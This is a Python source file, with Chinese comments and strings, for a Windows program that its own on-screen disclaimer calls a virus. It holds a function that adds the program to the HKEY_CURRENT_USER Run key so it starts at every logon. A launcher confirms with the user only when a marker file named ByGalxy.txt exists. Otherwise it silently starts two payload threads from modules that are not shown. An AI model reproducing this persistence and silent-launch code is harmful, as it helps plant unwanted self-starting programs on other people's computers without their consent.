import winreg
import os
import threading
import maliang
import banwuwuwu
import img_thebubu

"==========自启动程序=========="
def set_autostart_windows(app_name, exe_path):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        # 检查是否已存在
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
            try:
                current_value, _ = winreg.QueryValueEx(key, app_name)
                if current_value == exe_path:
                    return True
            except FileNotFoundError:
                pass  # 不存在，继续添加

        # 写入注册表
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
        return True
    except Exception as e:
        print(f"设置自启动失败: {e}")
        return False

"""
app_name = "MyApp"
exe_path = os.path.abspath(sys.executable)
"""
def win_yp(yoptcp_readme_xmjg, yoptcp_readme_xmmc, yoptcp_readme_xmzz, yoptcp_readme_cjsj):
    print("正在加载积极、向上、阳光的内容...")
    if os.path.exists("ByGalxy.txt"):
        print("好耶！萌新提醒器启动！")
        win_yp_size = 500, 300
        win_yp_title = "无尽炫步舞"
        root = maliang.Tk(size = win_yp_size, title = win_yp_title)
        cv = maliang.Canvas(auto_zoom = True, free_anchor = True)
        cv.place(width=500, height=300)
        
        maliang.Text(cv, (5, 0), text = "", fontsize = 16, anchor = "nw")
        maliang.Text(cv, (5, 20), text = "项目名称： %s"% yoptcp_readme_xmmc, fontsize = 12, anchor="nw")
        maliang.Text(cv, (5, 40), text = "项目作者： %s"% yoptcp_readme_xmzz, fontsize = 12, anchor="nw")
        maliang.Text(cv, (5, 60), text = "创建时间： %s"% yoptcp_readme_cjsj, fontsize = 12, anchor="nw")
        maliang.Text(cv, (5, 80), text = "免责声明： 该程序属于病毒程序, 仅供学习使用, 如果无意中打开请立即退出!!!", fontsize = 12, anchor = "nw")

        def on_button_win_yphks():
            print(yoptcp_readme_xmjg, "用户点击了确认启用按钮")
            root.destroy()
            ok_momo_by_yphk_t1 = threading.Thread(target=img_thebubu.xbyly)
            ok_momo_by_yphk_t2 = threading.Thread(target=banwuwuwu.main)
            ok_momo_by_yphk_t1.start()
            ok_momo_by_yphk_t2.start()
        def off_button_win_ypoff():
            print(yoptcp_readme_xmjg, "用户点击了取消程序按钮")
            root.destroy()

        maliang.Button(
            cv,
            text = "确认启用",
            command = on_button_win_yphks,
            fontsize = 12,
            position = (170, 200)
        )
        maliang.Button(
            cv,
            text = "取消程序",
            command = off_button_win_ypoff,
            fontsize = 12,
            position = (270, 200)
        )

        root.center() # 居中
        root.topmost(True) # 顶置
        root.mainloop()
    else:
        print("好，无尽炫步舞！")
        ok_momo_by_yphk_t1 = threading.Thread(target=img_thebubu.xbyly)
        ok_momo_by_yphk_t2 = threading.Thread(target=banwuwuwu.main)
        ok_momo_by_yphk_t1.start()
        ok_momo_by_yphk_t2.start()
